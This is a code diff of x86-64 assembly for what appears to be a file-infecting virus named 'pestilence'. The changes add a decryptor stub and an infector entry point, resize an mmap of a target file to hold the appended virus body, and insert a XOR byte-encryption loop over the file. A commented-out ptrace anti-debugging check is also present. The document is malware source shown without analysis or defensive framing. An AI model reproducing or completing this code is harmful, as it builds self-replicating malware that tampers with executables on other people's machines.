@@ -45,6 +45,8 @@
 %define PF_X	1
 %define PF_R	4
 %define PF_W	2
+
+
 ; ***  r15 offsets ****
 ; 0 = stack buffer = stat
 ; 48 = stat.st_size
@@ -87,13 +89,22 @@ _start:
 	sub rsp, 5000												; reserving 5000 bytes
 	mov r15, rsp
 	mov byte [r15 + 550], 0										; 0 for /tmp/test, 1 for /tmp/test2
-	mov qword [r15 + 551], 0										; addr for mmmap
 	; mov rax, SYS_PTRACE											; anti-debugging
 	; xor rdi, rdi
 	; syscall
 	; cmp rax, 0
 	; jl cleanup
-
+.decryptor:
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+	nop
+.infector:
 	call set_folder_chdir
 	chdir:
 		pop rdi
@@ -222,10 +233,9 @@ _start:
 			.encrypt:
 				; void * mmap( void * addr, size_t len, int prot, int flags, int fildes, off_t off );
 				xor rdi, rdi								; addr	-> rdi = NULL
-				mov rsi, _end - _start						; len	-> rsi = virus size
-				add rsi, r10								; target file + virus size
 				mov r11, r10
-				add r11, _end - _start								; backup final filesize	
+				add r11, _end - _start
+				mov rsi, r11								; len	-> rsi = original size + (_end - _start)
 				mov [r15 + 559], r11						; saving final filesize 
 				mov rdx, PROT_READ | PROT_WRITE				; prot	-> rdx = PROT_READ | PROT_WRITE
 				xor r9, r9								    ; offset = 0
@@ -233,16 +243,26 @@ _start:
 				mov r8, r12									; r8 = fd
 				mov rax, SYS_MMAP
 				syscall
-
 				cmp rax, MAP_FAILED							; check if mmap failed
 				jle .close_file
-				
+
 				mov r10, rax								; r10 = mmap address
 				; mmunmap(addr, len);
 				mov r13, [r15 + 48]
-
+				mov r11, [r15 + 559]			
+				; add r11, _start.infector - _start
+				sub r11, _eof - pestilence
 				.loop:
-
+					cmp r11, r13					; check if we reached final filesize
+					je .endloop
+					xor byte[r10 + r11], 42
+					xor byte[r10 + r11], 42
+					; xor byte[r10 + r11], 42
+					; xor byte[r10 + r11], 42
+					; xor byte[r10 + r11], 42
+					dec r11
+					jmp .loop
+				.endloop:
 				mov rdi, r10
 				mov rsi, [r15 + 559]						; rsi = final filesize
 				mov rax, SYS_MUNMAP
@@ -349,3 +369,4 @@ _end:
 	xor rdi, rdi
 	mov rax, SYS_EXIT
 	syscall
+_eof:
